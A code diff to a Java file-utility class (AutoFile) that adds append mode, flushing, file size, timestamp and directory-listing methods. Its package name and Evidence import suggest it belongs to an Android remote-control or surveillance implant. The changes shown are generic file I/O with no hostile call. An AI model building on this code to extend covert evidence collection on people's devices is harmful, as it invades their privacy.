@@ -9,6 +9,7 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.util.Date;
 
 import com.ht.RCSAndroidGUI.Evidence;
 import com.ht.RCSAndroidGUI.utils.Check;
@@ -22,6 +23,7 @@ public final class AutoFile {
 
 	/**
 	 * Instantiates a new auto flash file.
+	 * http://developer.android.com/guide/topics/data/data-storage.html#filesInternal
 	 * 
 	 * @param filename_
 	 *            the filename_
@@ -35,9 +37,9 @@ public final class AutoFile {
 	public boolean write(byte[] data, int offset, boolean append) {
 		OutputStream out = null;
 		try {
-			out = new BufferedOutputStream(new FileOutputStream(file));
+			out = new BufferedOutputStream(new FileOutputStream(file,append));
 			out.write(data, offset, data.length - offset);
-
+			out.flush();
 			return true;
 		} catch (Exception ex) {
 			return false;
@@ -87,9 +89,8 @@ public final class AutoFile {
 		return file.exists();
 	}
 
-	public int fileSize() {
-		// TODO Auto-generated method stub
-		return 0;
+	public long getSize() {
+		return file.length();
 	}
 
 	public void append(byte[] data) {
@@ -106,5 +107,17 @@ public final class AutoFile {
 
 	public void delete() {
 		file.delete();
+	}
+
+	public boolean isDirectory() {
+		return file.isDirectory();
+	}
+
+	public Date getFileTime() {
+		return new Date(file.lastModified());
+	}
+
+	public String[] list() {
+		return file.list();
 	}
 }
